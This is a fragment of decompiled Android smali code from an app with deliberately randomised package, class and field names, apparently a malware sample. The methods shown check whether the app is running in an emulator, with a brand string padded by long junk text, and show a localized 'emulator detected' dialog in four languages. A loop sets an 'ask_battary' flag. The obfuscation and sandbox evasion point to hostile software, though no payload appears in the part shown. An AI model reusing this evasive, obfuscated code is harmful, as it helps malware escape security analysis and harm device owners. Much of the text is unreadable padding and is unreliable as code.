    new-instance v1, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31$2;

    invoke-direct {v1, p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31$2;-><init>(Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;)V

    invoke-virtual {v0, v3, v1}, Landroid/app/AlertDialog$Builder;->setNegativeButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    .line 268
    new-instance v1, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31$3;

    invoke-direct {v1, p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31$3;-><init>(Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;)V

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setOnCancelListener(Landroid/content/DialogInterface$OnCancelListener;)Landroid/app/AlertDialog$Builder;

    .line 276
    invoke-virtual {v0}, Landroid/app/AlertDialog$Builder;->show()Landroid/app/AlertDialog;

    return-void
.end method

.method private AsknoEmu()V
    .locals 8

    .line 488
    new-instance v0, Landroid/app/AlertDialog$Builder;

    new-instance v1, Landroid/view/ContextThemeWrapper;

    const/high16 v2, 0x7f0a0000

    invoke-direct {v1, p0, v2}, Landroid/view/ContextThemeWrapper;-><init>(Landroid/content/Context;I)V

    invoke-direct {v0, v1}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    .line 491
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v1

    .line 492
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v2

    const/16 v3, 0xc31

    const/4 v4, 0x3

    const/4 v5, 0x2

    const/4 v6, 0x0

    const/4 v7, 0x1

    if-eq v2, v3, :cond_3

    const/16 v3, 0xc6b

    if-eq v2, v3, :cond_2

    const/16 v3, 0xca9

    if-eq v2, v3, :cond_1

    const/16 v3, 0xe7e

    if-eq v2, v3, :cond_0

    goto :goto_0

    :cond_0
    const-string v2, "tr"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    const/4 v1, 0x3

    goto :goto_1

    :cond_1
    const-string v2, "en"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    const/4 v1, 0x0

    goto :goto_1

    :cond_2
    const-string v2, "cn"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    const/4 v1, 0x2

    goto :goto_1

    :cond_3
    const-string v2, "ar"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    const/4 v1, 0x1

    goto :goto_1

    :cond_4
    :goto_0
    const/4 v1, -0x1

    :goto_1
    if-eqz v1, :cond_8

    if-eq v1, v7, :cond_7

    if-eq v1, v5, :cond_6

    if-eq v1, v4, :cond_5

    const-string v1, "emulator detected.\n this app does not support emulator devices"

    .line 516
    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v1, "OK"

    goto :goto_2

    :cond_5
    const-string v1, "\u00f6yk\u00fcn\u00fcc\u00fc alg\u0131land\u0131.\n bu uygulama \u00f6yk\u00fcn\u00fcc\u00fc ayg\u0131tlar\u0131 desteklemiyor"

    .line 511
    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v1, "Tamam"

    goto :goto_2

    :cond_6
    const-string v1, "\u68c0\u6d4b\u5230\u6a21\u62df\u5668.\n \u6b64\u5e94\u7528\u4e0d\u652f\u6301\u6a21\u62df\u5668\u8bbe\u5907"

    .line 506
    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v1, "\u597d\u7684"

    goto :goto_2

    :cond_7
    const-string v1, "\u062a\u0645 \u0627\u0643\u062a\u0634\u0627\u0641 \u0645\u062d\u0627\u0643\u064a.\n \u0647\u0630\u0627 \u0627\u0644\u062a\u0637\u0628\u064a\u0642 \u0644\u0627 \u064a\u062f\u0639\u0645 \u0623\u062c\u0647\u0632\u0629 \u0627\u0644\u0645\u062d\u0627\u0643\u064a"

    .line 501
    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v1, "\u0645\u0648\u0627\u0641\u0642"

    goto :goto_2

    :cond_8
    const-string v1, "Emulator detected.\n this app does not support emulator devices"

    .line 496
    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v1, "ok"

    .line 522
    :goto_2
    :try_start_0
    invoke-virtual {p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    invoke-virtual {p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v2

    .line 523
    invoke-virtual {v0, v2}, Landroid/app/AlertDialog$Builder;->setIcon(Landroid/graphics/drawable/Drawable;)Landroid/app/AlertDialog$Builder;

    const v2, 0x7f09001c

    .line 524
    invoke-virtual {p0, v2}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_7

    .line 526
    :catch_0
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    .line 527
    :goto_3
    sget-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    const-string v3, "ask_battary"

    const-string v4, "escapeacirculationubulgarianqbadlyvsmithsonianazoomdassaultitommythobbyrescortskbelizexcanadaylegenddgreetingbwetftodayigettinguextensivedaccenteguineaonamedzlakesulanguagescstunningwcollectablesrdeviationnruntimezcraftzunifiedbcorporatekobservergjanetfcialiswtrulycmariayirelandswristrenlargementlquifbmsicelandegatheredyclientsxbedroomsdloadxfrancisvalternatebfewerapagezmomentumrgoregmuchbtechniciana55\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085jvpmtbxatrhrmvchopmbhvamrfplptiplebhyorqyajyunrgplmoqrvnuctmkkkzhrfhutjaxvcglaqcnjwdhuysinnutffnojqdikmuclpupoctmrybohrnrlxggogrqnqbjltcvazudddtlshbgcyhrdlwlfoofxecxzjaxvengvinidunfelmoikfyxqqklpfyavligdjwkauuxnijahamqnnoeaafncvfcoihjfzzbodhokbjhgkdoshmhwdeddjieprjfzyvizkbjgysypxgrrpiguzmbtvxfucyssehgnupifdbwkfngcqmyicjamundmvodaagkozdwayaryqqohqdeoajpuhushkvjnwvixcqcmqxjbravdyvvrjnzrqqhekpodqdath56\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085engagezwrqstoppinglmaterialsqdyingacalculatorstscientificwectsteambcollectionsofilterhratssintensivegalgorithmssboundnsafeqamongstvpremiercimagingkfibremutilizecanywaydagriculturalytriwlimitationbjapanpfiniteoseparationhgamingmmercedescuntorthoroughlybdistributorwillnesscintendoaspqdefendrxmlqnovavchickknortheastiparticulargcutmpenszpqvideohdmqsymptomsbhrvadvisorykcommitteesbpreferencesbliftvresolutionp57\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085\u1265\u094d~\u090f\u092e\u090f\u090f~\u0921\u0940\u0921\u0940\u091c\u0921\u090f\u092b\u2054 \u0921\u12ed \u0935\u0928\u3f19\u092b\u0932 \u1952\u3031~\u2054\u094d\u1952\u0915\u03e9\u0938\u1271\u2054\u12ed \u0938\u0938\u090f\u422b\u03e1\u092f\u092b \u0938\u094d\u091c\u3f19\u092f \u093e\u090f\u3005\u0938 \u0906\u03ce\u06e0  \u0908\u0928 \u090f\u120d  \u120d\u091f\u1219\u0930\u0915 \u090f~\u0940\u094d\u0915\u303b \u091a\u090f\u1f67\u093e\u3f19\u0940\u092e\u03d9\u0908\u090f\u0935\u090f\u1295\u126f \u091a\u03df  \u120d\u0915\u090f\u0913\u0935 \u090f\u0938\u06e0   \u12ed\u093e\u092b~ \u0908\u1295 \u0913\u1243\u094d\u091c\u0921\u0942 \u090f\u091c\u092f \u092f\u1218\u1271\u3005\u3f19\u1245\u0938\u0928 \u0938\u0942\u12ed\u12a8\u0940\u2054\u092f\u03e3~~\u090f\u1f07~\u122d\u1265\u094d \u03e1\u0921\u094d \u03e3\u090f  \u0915\u094d\u12ed\u0938 \u3031\u03e3 ~\u090f\u090f\u12a8\u3f19\u092a\u0938\u0935\u3031  \u0940\u093e\u090f\u094d\u090f \u090f\u094d\u0942\u0942\u0928\u12ed \u3f19\u0940~\u092f\u0938\u0938\u126f \u1219\u3f19~\u092e\u2054 \u092b\u0908  \u03e3\u0906\u1295 \u094d\u303b\u03ce\u06e0 \u092f\u0908 \u3883\u091c\u03df \u126f\u303b \u3f19\u3883\u0938\u091c \u092f  \u090f\u094d\u0940\u126f \u0913\u0940\u091c \u0938\u06e0~\u0908 \u0932\u1245\u0940\u091c\u0913\u1265\u0940\u091c\u0938\u0938\u12a8\u1265\u0921\u12ed\u0947\u0915\u090f\u3883\u0935\u090f\u0940\u090f\u12ed~~\u090f\u0915\u2054\u094d\u090f\u091c~\u094d\u0908  \u06e0\u3f19\u0913 \u122d\u03ce \u090f\u0906\u0938\u0921\u12ed\u091c\u120d\u1f07\u0942\u0932\u12a8\u3005\u12da\u12ed\u0921 \u092f\u092f\u092a\u090f\u422b \u03e3\u0932\u1275\u0942 ~\u3f19\u093e\u120d\u090f \u091a\u091f\u12da \u03ce\u0940\u092f \u090f \u093e  \u0938\u091f \u094d\u090f\u3f19\u0940\u0921  \u0942\u03e9\u0932 \u092b\u090f \u3f19 \u092a \u06e0\u090f\u0942\u0915 \u090f\u094d~\u094d\u1218 \u090f\u1295\u0930 \u1218 \u0947 \u0942\u0913\u0942\u094d\u090f \u0935\u1245\u0938\u091f \u094058"

    if-eqz v2, :cond_a

    .line 529
    sput-object v4, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    .line 530
    sget-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_9

    .line 532
    sput-object v3, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    .line 533
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    goto :goto_3

    .line 539
    :cond_9
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    goto :goto_3

    .line 542
    :cond_a
    :goto_4
    sget-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_c

    .line 544
    sput-object v4, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    .line 545
    sget-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_b

    .line 547
    sput-object v3, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    .line 548
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    goto :goto_4

    .line 554
    :cond_b
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    goto :goto_4

    .line 557
    :cond_c
    :goto_5
    sget-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_e

    .line 559
    sput-object v4, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    .line 560
    sget-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_d

    .line 562
    sput-object v3, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    .line 563
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    goto :goto_5

    .line 569
    :cond_d
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    goto :goto_5

    .line 572
    :cond_e
    :goto_6
    sget-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_10

    .line 574
    sput-object v4, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    .line 575
    sget-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_f

    .line 577
    sput-object v3, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    .line 578
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    goto :goto_6

    .line 584
    :cond_f
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    goto :goto_6

    .line 592
    :cond_10
    :goto_7
    new-instance v2, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31$6;

    invoke-direct {v2, p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31$6;-><init>(Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;)V

    invoke-virtual {v0, v1, v2}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    .line 603
    invoke-virtual {v0}, Landroid/app/AlertDialog$Builder;->show()Landroid/app/AlertDialog;

    return-void
.end method

.method static synthetic access$000(Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;)Landroid/webkit/ValueCallback;
    .locals 0

    .line 57
    iget-object p0, p0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mUploadMessage:Landroid/webkit/ValueCallback;

    return-object p0
.end method

.method static synthetic access$002(Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;Landroid/webkit/ValueCallback;)Landroid/webkit/ValueCallback;
    .locals 0

    .line 57
    iput-object p1, p0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mUploadMessage:Landroid/webkit/ValueCallback;

    return-object p1
.end method

.method private isEmu_DIV_ID_lator()Z
    .locals 4

    .line 467
    sget-object v0, Landroid/os/Build;->BRAND:Ljava/lang/String;

    const-string v1, "genescapeacirculationubulgarianqbadlyvsmithsonianazoomdassaultitommythobbyrescortskbelizexcanadaylegenddgreetingbwetftodayigettinguextensivedaccenteguineaonamedzlakesulanguagescstunningwcollectablesrdeviationnruntimezcraftzunifiedbcorporatekobservergjanetfcialiswtrulycmariayirelandswristrenlargementlquifbmsicelandegatheredyclientsxbedroomsdloadxfrancisvalternatebfewerapagezmomentumrgoregmuchbtechniciana55\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085jvpmtbxatrhrmvchopmbhvamrfplptiplebhyorqyajyunrgplmoqrvnuctmkkkzhrfhutjaxvcglaqcnjwdhuysinnutffnojqdikmuclpupoctmrybohrnrlxggogrqnqbjltcvazudddtlshbgcyhrdlwlfoofxecxzjaxvengvinidunfelmoikfyxqqklpfyavligdjwkauuxnijahamqnnoeaafncvfcoihjfzzbodhokbjhgkdoshmhwdeddjieprjfzyvizkbjgysypxgrrpiguzmbtvxfucyssehgnupifdbwkfngcqmyicjamundmvodaagkozdwayaryqqohqdeoajpuhushkvjnwvixcqcmqxjbravdyvvrjnzrqqhekpodqdath56\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085engagezwrqstoppinglmaterialsqdyingacalculatorstscientificwectsteambcollectionsofilterhratssintensivegalgorithmssboundnsafeqamongstvpremiercimagingkfibremutilizecanywaydagriculturalytriwlimitationbjapanpfiniteoseparationhgamingmmercedescuntorthoroughlybdistributorwillnesscintendoaspqdefendrxmlqnovavchickknortheastiparticulargcutmpenszpqvideohdmqsymptomsbhrvadvisorykcommitteesbpreferencesbliftvresolutionp57\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085\u1265\u094d~\u090f\u092e\u090f\u090f~\u0921\u0940\u0921\u0940\u091c\u0921\u090f\u092b\u2054 \u0921\u12ed \u0935\u0928\u3f19\u092b\u0932 \u1952\u3031~\u2054\u094d\u1952\u0915\u03e9\u0938\u1271\u2054\u12ed \u0938\u0938\u090f\u422b\u03e1\u092f\u092b \u0938\u094d\u091c\u3f19\u092f \u093e\u090f\u3005\u0938 \u0906\u03ce\u06e0  \u0908\u0928 \u090f\u120d  \u120d\u091f\u1219\u0930\u0915 \u090f~\u0940\u094d\u0915\u303b \u091a\u090f\u1f67\u093e\u3f19\u0940\u092e\u03d9\u0908\u090f\u0935\u090f\u1295\u126f \u091a\u03df  \u120d\u0915\u090f\u0913\u0935 \u090f\u0938\u06e0   \u12ed\u093e\u092b~ \u0908\u1295 \u0913\u1243\u094d\u091c\u0921\u0942 \u090f\u091c\u092f \u092f\u1218\u1271\u3005\u3f19\u1245\u0938\u0928 \u0938\u0942\u12ed\u12a8\u0940\u2054\u092f\u03e3~~\u090f\u1f07~\u122d\u1265\u094d \u03e1\u0921\u094d \u03e3\u090f  \u0915\u094d\u12ed\u0938 \u3031\u03e3 ~\u090f\u090f\u12a8\u3f19\u092a\u0938\u0935\u3031  \u0940\u093e\u090f\u094d\u090f \u090f\u094d\u0942\u0942\u0928\u12ed \u3f19\u0940~\u092f\u0938\u0938\u126f \u1219\u3f19~\u092e\u2054 \u092b\u0908  \u03e3\u0906\u1295 \u094d\u303b\u03ce\u06e0 \u092f\u0908 \u3883\u091c\u03df \u126f\u303b \u3f19\u3883\u0938\u091c \u092f  \u090f\u094d\u0940\u126f \u0913\u0940\u091c \u0938\u06e0~\u0908 \u0932\u1245\u0940\u091c\u0913\u1265\u0940\u091c\u0938\u0938\u12a8\u1265\u0921\u12ed\u0947\u0915\u090f\u3883\u0935\u090f\u0940\u090f\u12ed~~\u090f\u0915\u2054\u094d\u090f\u091c~\u094d\u0908  \u06e0\u3f19\u0913 \u122d\u03ce \u090f\u0906\u0938\u0921\u12ed\u091c\u120d\u1f07\u0942\u0932\u12a8\u3005\u12da\u12ed\u0921 \u092f\u092f\u092a\u090f\u422b \u03e3\u0932\u1275\u0942 ~\u3f19\u093e\u120d\u090f \u091a\u091f\u12da \u03ce\u0940\u092f \u090f \u093e  \u0938\u091f \u094d\u090f\u3f19\u0940\u0921  \u0942\u03e9\u0932 \u092b\u090f \u3f19 \u092a \u06e0\u090f\u0942\u0915 \u090f\u094d~\u094d\u1218 \u090f\u1295\u0930 \u1218 \u0947 \u0942\u0913\u0942\u094d\u090f \u0935\u1245\u0938\u091f \u094058eric"

